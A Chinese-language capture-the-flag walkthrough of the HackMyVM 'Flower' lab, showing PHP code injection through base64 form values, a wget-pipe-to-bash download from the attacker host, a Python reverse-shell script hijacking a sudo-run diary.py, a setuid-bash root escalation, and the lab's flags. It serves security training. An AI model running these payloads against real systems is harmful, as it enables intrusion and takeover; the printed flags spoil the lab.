# Flower

2024-11-06 https://hackmyvm.eu/machines/machine.php?vm=Flower

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
80/tcp open  http
```

查看 web 源代码，发现 selection 中对应的 value 值是 base64 编码，如第一项 MSsy 解码后为 1+2 选择后，返回的结果是 3，说明这里执行了 php 代码，存在漏洞，抓包修改 petals=c3lzdGVtKCdpZCcp (system('id')) 可以看到 www-data 的用户。

直接创建回连系统命令 system('wget -q -O - http://192.168.5.3/5.3/8888.sh|bash') base64 编码后为 c3lzdGVtKCd3Z2V0IC1xIC1PIC0gaHR0cDovLzE5Mi4xNjguNS4zLzUuMy84ODg4LnNofGJhc2gnKQ== 执行后得到了反弹的 shell。

/home/rose 目录中有 user flag 文件，但是没有读取权限，需要升级到此用户权限才行。

sudo -l 发现：

```
(rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py

www-data@flower:/var/spool/cron$ cat /home/rose/diary/diary.py
import pickle

diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
p = open('diary.pickle','wb')
pickle.dump(diary,p)
```

同时发现 /home/rose/diary 文件夹的权限是 777 所以我们可以直接在外层将整个文件夹删除 rm -rf /home/rose/diary

然后重新创建 diary.py 文件 内容如下：

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.3",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

或者在同一目录，创建 pickle.py 文件，内容为上述代码，同样在执行时，也能得到回连 shell。

sudo 执行得到了反弹的 7777 端口的 shell：

```
sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
```

得到了 user flag：

```
rose@flower:~$ cat user.txt
HMV{R0ses_are_R3d$}
```

sudo -l 发现提权到 root 的路径：

```
(root) NOPASSWD: /bin/bash /home/rose/.plantbook
```

对 /home/rose/.plantbook 有修改权限，直接修改其内容为：

```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod  +xs /tmp/rootbash
```

sudo 执行：

```
rose@flower:~$ sudo /bin/bash /home/rose/.plantbook
rose@flower:~$ /tmp/rootbash -p
rootbash-5.0# cd /root
rootbash-5.0# ls
root.txt
rootbash-5.0# cat root.txt
HMV{R0ses_are_als0_black.}
```
